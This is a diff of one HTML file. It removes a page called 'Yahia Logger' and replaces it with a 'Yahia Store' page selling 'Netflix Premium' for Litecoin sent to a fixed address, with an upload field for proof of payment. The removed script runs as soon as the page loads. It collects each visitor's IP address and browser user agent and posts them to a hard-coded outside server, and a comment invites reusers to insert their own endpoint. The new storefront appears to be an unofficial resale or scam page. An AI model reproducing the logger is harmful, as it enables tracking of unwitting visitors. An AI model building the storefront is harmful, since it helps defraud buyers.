@@ -1,52 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Yahia Logger</title>
-    <style>
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
-        }
-        b {
-            font-weight: bold;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <title>Yahia Store | Digital Products</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 { color: #333; }
+    .product {
+      background: #fff;
+      padding: 20px;
+      margin: 20px auto;
+      border-radius: 8px;
+      max-width: 400px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .qr {
+      margin-top: 15px;
+    }
+    input[type="file"] {
+      margin-top: 10px;
+    }
+    footer {
+      margin-top: 50px;
+      color: #888;
+    }
+  </style>
 </head>
 <body>
-    <h1><b>[ + ]</b> أهلاً بك في Logger Yahia</h1>
-    <p><b>[ + ]</b> يتم الآن جمع معلومات جهازك...</p>
-    <p><b>[ + ]</b> جميع الحقوق محفوظة لـ Yahia</p>
+  <h1>📦 Yahia Store</h1>
+  <p>Buy your favorite digital products easily via Litecoin</p>
 
-    <script>
-        async function sendData() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ip = data.ip;
+  <div class="product">
+    <h2>Netflix Premium</h2>
+    <p>Price: 5 USDT (Litecoin equivalent)</p>
+    <h3>Pay to this Litecoin Address:</h3>
+    <code>LKUxvTSYvTAr5C8cqht7BDQV16oE364VjS</code>
+    <div class="qr">
+      <img src="https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=LKUxvTSYvTAr5C8cqht7BDQV16oE364VjS" alt="Litecoin QR Code">
+    </div>
+    <p>After payment, upload your payment proof:</p>
+    <input type="file">
+  </div>
 
-            const userAgent = navigator.userAgent;
-
-            const payload = {
-                ip: ip,
-                user_agent: userAgent
-            };
-
-            fetch('http://102.164.96.33:8000/log', {  // غيّر الرابط حسب API حقك
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).then(res => {
-                console.log('[ + ] Sent to server');
-            }).catch(err => {
-                console.error('[ + ] Failed to send:', err);
-            });
-        }
-
-        sendData();
-    </script>
+  <footer>© 2025 Yahia Store | Powered by Litecoin</footer>
 </body>
 </html>
